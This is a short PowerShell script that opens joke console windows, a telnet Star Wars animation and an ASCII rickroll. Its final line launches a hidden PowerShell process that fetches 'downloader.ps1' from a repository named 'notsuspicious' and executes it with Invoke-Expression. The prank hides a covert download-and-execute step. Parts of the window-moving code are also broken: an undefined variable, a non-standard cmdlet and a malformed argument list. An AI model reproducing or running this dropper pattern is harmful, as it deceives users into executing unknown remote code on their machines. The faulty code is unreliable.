
# Start Star Wars in a new Command Prompt window to the left
Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -WindowStyle Normal
# Start rickroll in ASCII in a new Command Prompt window to the right
Start-Process cmd -ArgumentList "/c start cmd /k curl -L http://artscene.textfiles.com/asciiart/musicsongs/nevergonna.txt" -WindowStyle Normal

# Wait for a moment to let the windows start
Start-Sleep -Seconds 5

# Move the Star Wars window 200px to the left of the PowerShell window
$leftPos = $psWindow.MainWindowLeft - 200
Move-Window -ProcessName "cmd" -Left $leftPos -Top $psWindow.MainWindowTop -Width 800 -Height 600

# Move the rickroll window 200px to the right of the PowerShell window
$rightPos = $psWindow.MainWindowLeft + $psWindow.MainWindowWidth + 200
Move-Window -ProcessName "cmd" -Left $rightPos -Top $psWindow.MainWindowTop -Width 800 -Height 600

# Start the downloader.ps1 script in a hidden, detached PowerShell window
Start-Process powershell -ArgumentList "-WindowStyle Hidden, -NoLogo, -NoNewWindow, -Command `"& { Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content`"}"
